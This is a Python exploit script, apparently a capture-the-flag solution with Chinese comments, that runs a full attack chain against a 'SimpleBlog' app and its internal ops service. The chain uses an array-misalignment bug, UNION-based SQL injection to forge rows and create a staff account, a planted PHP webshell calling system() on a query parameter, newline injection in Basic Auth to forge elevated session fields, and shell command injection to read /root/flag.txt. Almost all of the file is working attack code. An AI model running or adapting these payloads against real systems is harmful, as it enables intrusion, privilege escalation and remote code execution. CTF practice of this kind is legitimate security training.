#!/usr/bin/env python3
"""cwp (SimpleBlog) 利用链.

题解给出的完整链条:
  /api/bulk 执行器数组错位 (构建失败的操作让 matched/checked 错位)
    -> 未声明参数 omit 送达 /api/articles, 触发 owner_not_in 字符串拼接 SQL 注入
    -> 联合查询伪造 snap_stale=1 的行, 触发 pending_changeset / api_reload
    -> hook 把全局发布身份改成真实 staff, 重放时匿名创建 staff 账号
    -> staff 后台皮肤编辑器把 name/code 原样写成 <dir>/<name>.php
    -> 容器内命令执行, 再打内网管理服务 (/ops/code 源码泄露, 空 scramble 会话
       明文写入 + Basic Auth 换行注入 + sudo_until 短路 -> 高权限)
    -> 管理服务 ls -la <path> 直接拼接 shell, path 处命令注入读 /root/flag.txt

说明: 后台编辑器与内网管理服务的具体路由需按目标实测, 这里用候选路由探测,
可用 --skin-endpoint / --ops-list 等参数覆盖.

用法:
    python exp.py --base http://TARGET
    python exp.py --base http://TARGET --staff-user admin --ops-base http://127.0.0.1:8082
"""

import argparse
import base64
import json
import re
import secrets
import sys
import time

import requests

# 任何能让 parse_url() 返回 false 的占位值, 用于制造数组错位
ERR_ROUTE = "http://:80"

# 伪造行的 id 取极大值, 避免覆盖真实文章; 10 列与 entry 表严格对齐
FORGED_ID_A = 9100000001  # pending/changeset -> 把全局发布身份设为 staff
FORGED_ID_B = 9100000002  # api/reload       -> 重放整批操作

SKIN_ENDPOINTS = [
    "/admin/skins",
    "/admin/skin",
    "/admin/theme",
    "/admin/themes",
    "/admin/templates",
    "/api/admin/skins",
    "/admin/api/skins",
]
SKIN_DIRS = ["/skins", "/templates", "/themes", "/assets/skins", "/uploads", "/skin"]

LOGIN_ENDPOINTS = ["/login", "/api/login", "/admin/login", "/auth/login"]

OPS_LIST_ENDPOINTS = ["/ops/files", "/ops/list", "/ops/browse", "/ops/fs", "/ops/ls"]


class Blog:
    def __init__(self, base, timeout=20):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()

    # ---------- 基础 ----------
    def articles(self, **params):
        response = self.session.get(
            self.base + "/api/articles", params=params, timeout=self.timeout
        )
        try:
            return response.json()
        except ValueError:
            return {"_raw": response.text[:400], "_status": response.status_code}

    def bulk(self, policy, ops):
        response = self.session.post(
            self.base + "/api/bulk",
            json={"policy": policy, "ops": ops},
            timeout=self.timeout,
        )
        return response

    def items(self, data):
        if isinstance(data, dict):
            for key in ("items", "articles", "data", "rows"):
                if isinstance(data.get(key), list):
                    return data[key]
        if isinstance(data, list):
            return data
        return []

    # ---------- 阶段 1: 确认数组错位 ----------
    def probe_shift(self):
        baseline = self.items(self.articles())
        if not baseline:
            raise RuntimeError("/api/articles 无数据, 检查入口是否正确")
        keys_before = set(baseline[0].keys())

        ops = [
            {"route": ERR_ROUTE, "verb": "GET"},
            {"route": "/api/tags", "verb": "GET", "data": {"omit": "excerpt"}},
            {"route": "/api/articles", "verb": "GET"},
        ]
        response = self.bulk("best-effort", ops)
        print("[i] 错位探针 -> %d %s" % (response.status_code, response.text[:160].replace("\n", " ")))

        shifted = False
        if response.status_code == 200:
            for item in self.items(response.json() if response.text else {}):
                if keys_before - set(item.keys()):
                    shifted = True
        if not shifted:
            # 再试一次: 参数落在 /api/articles 上时列表结构/条数会变化
            after = self.items(self.articles(omit="excerpt"))
            shifted = bool(after) and keys_before - set(after[0].keys())
        print("[%s] 数组错位%s" % ("+" if shifted else "!", "已确认" if shifted else "未确认(继续尝试注入)"))
        return shifted

    # ---------- 阶段 2: SQL 注入 ----------
    def inject_read(self, subquery):
        """owner NOT IN (0) AND 1=0 UNION SELECT ... -- - : 把 subquery 的结果读回 title 列."""
        forged = (
            "0) AND 1=0 "
            "UNION SELECT %d,(%s),'cwp','cwp','cwp','2024-01-01 00:00:00','draft','post',0,0 "
            "-- -" % (FORGED_ID_A, subquery)
        )
        ops = [
            {"route": ERR_ROUTE, "verb": "GET"},
            {"route": "/api/tags", "verb": "GET", "data": {"omit": forged}},
            {"route": "/api/articles", "verb": "GET"},
        ]
        response = self.bulk("best-effort", ops)
        try:
            payload = response.json()
        except ValueError:
            return None
        for item in self.items(payload):
            if str(item.get("id")) == str(FORGED_ID_A):
                value = item.get("title")
                if value and value != "cwp":
                    return value
        return None

    def enumerate_staff(self):
        candidates = [
            "SELECT login FROM users WHERE role='staff' LIMIT 1",
            "SELECT login FROM users LIMIT 1",
            "SELECT username FROM users LIMIT 1",
            "SELECT login FROM staff LIMIT 1",
            "SELECT username FROM admins LIMIT 1",
        ]
        for subquery in candidates:
            try:
                value = self.inject_read(subquery)
            except requests.RequestException:
                value = None
            if value:
                print("[+] 注入枚举到账号: %s  (%s)" % (value, subquery))
                return value
            print("[!] 枚举失败: %s" % subquery)
        return None

    # ---------- 阶段 3: 伪造快照行 + 匿名创建 staff ----------
    def create_staff(self, owner, login, password):
        forged = (
            "0) AND 1=0 "
            "UNION SELECT %d,'cwp','cwp','%s','cwp','2024-01-01 00:00:00','pending','changeset',0,1 "
            "UNION SELECT %d,'cwp','cwp','x','cwp','2024-01-01 00:00:00','api','reload',0,1 "
            "-- -" % (FORGED_ID_A, owner, FORGED_ID_B)
        )
        inner_ops = [
            {"route": ERR_ROUTE, "verb": "GET"},
            {"route": "/api/tags", "verb": "GET", "data": {"omit": forged}},
            {"route": "/api/articles", "verb": "GET"},
            {"route": "/api/users", "verb": "POST", "data": {"login": login, "pass": password}},
        ]
        ops = [
            {"route": ERR_ROUTE, "verb": "POST"},
            {
                "route": "/api/articles/1/comments",
                "verb": "POST",
                "data": {"id": 1, "author": "", "text": "", "ops": inner_ops},
            },
            {"route": "/api/bulk", "verb": "POST"},
        ]
        response = self.bulk("best-effort", ops)
        print("[i] 伪造行 + 创建账号 -> %d %s"
              % (response.status_code, response.text[:200].replace("\n", " ")))
        return response

    # ---------- 阶段 4: 登录 ----------
    def login(self, login, password):
        for endpoint in LOGIN_ENDPOINTS:
            for kind, kwargs in (
                ("json", {"json": {"login": login, "pass": password}}),
                ("form", {"data": {"login": login, "pass": password}}),
                ("form", {"data": {"login": login, "password": password}}),
            ):
                try:
                    response = self.session.post(
                        self.base + endpoint, timeout=self.timeout, **kwargs
                    )
                except requests.RequestException:
                    continue
                text = response.text[:200].replace("\n", " ")
                print("[i] %s (%s) -> %d %s" % (endpoint, kind, response.status_code, text))
                if response.status_code < 400 and not re.search(
                    r"invalid|denied|error|required", text, re.I
                ):
                    if self.session.cookies.get_dict():
                        print("[+] 已获得 staff 会话: %s" % self.session.cookies.get_dict())
                        return True
        return False

    # ---------- 阶段 5: 后台皮肤编辑器写 PHP ----------
    def upload_skin(self, name, code):
        for endpoint in SKIN_ENDPOINTS:
            try:
                response = self.session.post(
                    self.base + endpoint,
                    json={"name": name, "code": code},
                    timeout=self.timeout,
                )
            except requests.RequestException:
                continue
            print("[i] 皮肤上传 %s -> %d" % (endpoint, response.status_code))
            if response.status_code >= 400:
                continue
            for directory in SKIN_DIRS:
                url = "%s%s/%s.php" % (self.base, directory, name)
                try:
                    probe = self.session.get(url, params={"c": "id"}, timeout=self.timeout)
                except requests.RequestException:
                    continue
                if "uid=" in probe.text:
                    print("[+] webshell: %s" % url)
                    return url
        return None

    def rce(self, url, command):
        response = self.session.get(url, params={"c": command}, timeout=self.timeout)
        return response.text


def ops_stage(ops_base, timeout, list_endpoint=None):
    """攻击与博客同机的内网管理服务."""
    session = requests.Session()
    ops_base = ops_base.rstrip("/")

    source = session.get(ops_base + "/ops/code", timeout=timeout)
    print("[i] /ops/code -> %d, %d 字节" % (source.status_code, len(source.text)))
    if source.status_code == 200:
        print(source.text[:1500])

    token = secrets.token_hex(16)
    cookies = {"hpx_id": token + ","}  # 逗号后 scramble 为空 -> 会话明文写入
    sudo_until = int(time.time()) + 3600
    # Basic Auth 只按冒号/换行切分, pass 里夹带的换行成为新的状态字段
    cred = "root:x\nmaster_flag=1\notp_done=1\nsudo_until=%d" % sudo_until
    headers = {"Authorization": "Basic " + base64.b64encode(cred.encode()).decode()}

    # 写入走另一条路径, 不会让缓存失效; zone 不匹配的请求强制重新扫描会话
    for path in ("/ops/zones/__mismatch__", "/ops/zone/__mismatch__", "/ops/session"):
        try:
            refresh = session.get(ops_base + path, headers=headers, cookies=cookies, timeout=timeout)
            print("[i] 刷新会话 %s -> %d" % (path, refresh.status_code))
        except requests.RequestException as exc:
            print("[!] 刷新会话 %s 失败: %s" % (path, exc))

    endpoints = [list_endpoint] if list_endpoint else OPS_LIST_ENDPOINTS
    for endpoint in endpoints:
        try:
            probe = session.get(
                ops_base + endpoint, params={"path": "/"}, headers=headers,
                cookies=cookies, timeout=timeout,
            )
        except requests.RequestException:
            continue
        if probe.status_code != 200:
            print("[i] %s -> %d" % (endpoint, probe.status_code))
            continue
        print("[+] 文件列表接口: %s" % endpoint)
        # path 直接拼进 "ls -la " + path, 用分号闭合后执行任意命令
        injected = session.get(
            ops_base + endpoint,
            params={"path": "; cat /root/flag.txt"},
            headers=headers, cookies=cookies, timeout=timeout,
        )
        print("----- ops output -----")
        print(injected.text)
        print("----------------------")
        match = re.search(r"flag\{[^}]*\}", injected.text)
        if match:
            return match.group(0)
    return None


def main():
    parser = argparse.ArgumentParser(description="cwp SimpleBlog full chain")
    parser.add_argument("--base", default="http://TARGET", help="博客入口")
    parser.add_argument("--staff-user", default=None, help="用于伪造身份的 staff 登录名")
    parser.add_argument("--new-user", default=None, help="新建 staff 账号名(默认随机)")
    parser.add_argument("--new-pass", default=None, help="新建 staff 口令(默认随机)")
    parser.add_argument("--ops-base", default="http://127.0.0.1:8082", help="内网管理服务地址")
    parser.add_argument("--ops-list", default=None, help="管理服务文件列表接口路径")
    parser.add_argument("--skip-ops", action="store_true", help="跳过内网管理服务阶段")
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()

    blog = Blog(args.base, args.timeout)
    blog.probe_shift()

    owner = args.staff_user or blog.enumerate_staff()
    if not owner:
        owner = args.staff_user or "admin"
        print("[!] 未枚举到 staff, 使用占位账号 %r (可用 --staff-user 指定)" % owner)

    login = args.new_user or "staff_" + secrets.token_hex(3)
    password = args.new_pass or secrets.token_hex(6)
    blog.create_staff(owner, login, password)
    print("[i] 尝试用 %s / %s 登录" % (login, password))

    if not blog.login(login, password):
        raise SystemExit("[-] staff 账号未生效: 检查 SQL 注入是否回显伪造行 / --staff-user 是否正确")

    shell_code = "<?php echo 'PWNED'; system($_GET['c']); ?>"
    shell_url = blog.upload_skin("cwp_%s" % secrets.token_hex(3), shell_code)
    if not shell_url:
        raise SystemExit("[-] 皮肤编辑器落点未找到, 用 --skin-endpoint 手工调整")

    output = blog.rce(shell_url, "id; hostname; ip -4 addr 2>/dev/null | grep inet")
    print("----- webshell -----")
    print(output)
    print("--------------------")

    if args.skip_ops:
        return

    flag = ops_stage(args.ops_base, args.timeout, args.ops_list)
    if flag:
        print("[+] flag: " + flag)
    else:
        print("[i] 管理服务阶段未取到 flag, 可结合上面的 webshell 手工继续")


if __name__ == "__main__":
    main()
